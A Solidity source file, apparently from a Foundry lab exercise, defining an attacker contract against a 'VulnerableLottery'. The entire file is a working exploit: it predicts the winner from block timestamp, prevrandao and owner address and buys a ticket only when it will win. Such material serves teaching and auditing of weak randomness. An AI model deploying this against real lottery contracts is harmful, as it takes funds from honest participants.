// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableLottery.sol";
import "forge-std/console.sol";

contract LotteryAttacker {
    VulnerableLottery public lottery;
    address public owner;
    
    constructor(address _lotteryAddress) {
        lottery = VulnerableLottery(_lotteryAddress);
        owner = msg.sender;
    }
    
    function predictWinnerIndex() public view returns (uint256) {
        uint256 randomNumber = uint256(keccak256(abi.encodePacked(
            block.timestamp,
            block.prevrandao,
            lottery.owner()
        )));
        
        uint256 participantsCount = lottery.getParticipantsCount() + 1;
        return randomNumber % participantsCount;
    }
    
    function attack() public payable {
        require(msg.sender == owner, "Only owner");
        require(msg.value >= lottery.ticketPrice(), "Insufficient funds");
        
        uint256 currentParticipants = lottery.getParticipantsCount();
        uint256 predictedIndex = predictWinnerIndex();
        
        console.log("[ATTACK] Current participants:", currentParticipants);
        console.log("[ATTACK] Predicted winner index:", predictedIndex);
        console.log("[ATTACK] My future index:", currentParticipants);
        
        if (predictedIndex == currentParticipants) {
            console.log("[ATTACK] I will win! Buying ticket...");
            lottery.buyTicket{value: lottery.ticketPrice()}();
            console.log("[ATTACK] Ticket purchased");
        } else {
            console.log("[ATTACK] I won't win. Skipping...");
            revert("Not favorable");
        }
    }
    
    receive() external payable {
        console.log("[WON] Received prize:", msg.value);
    }
}

